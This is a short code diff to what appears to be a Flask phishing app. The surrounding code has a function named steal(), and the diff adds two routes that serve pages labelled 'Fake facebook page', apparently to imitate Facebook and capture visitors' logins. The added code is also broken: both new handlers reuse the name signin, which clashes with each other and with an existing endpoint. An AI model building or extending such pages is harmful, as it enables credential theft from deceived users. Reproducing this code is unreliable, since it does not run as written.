@@ -77,3 +77,15 @@ def steal():
         return redirect(url_for("signin"))
 
     return redirect(url_for("index"))
+
+
+@app.route("/portals/alert")
+def signin():
+    """Fake facebook page."""
+    return render_template("alert.html")
+
+
+@app.route("/portals/mission")
+def signin():
+    """Fake facebook page."""
+    return render_template("mission.html")
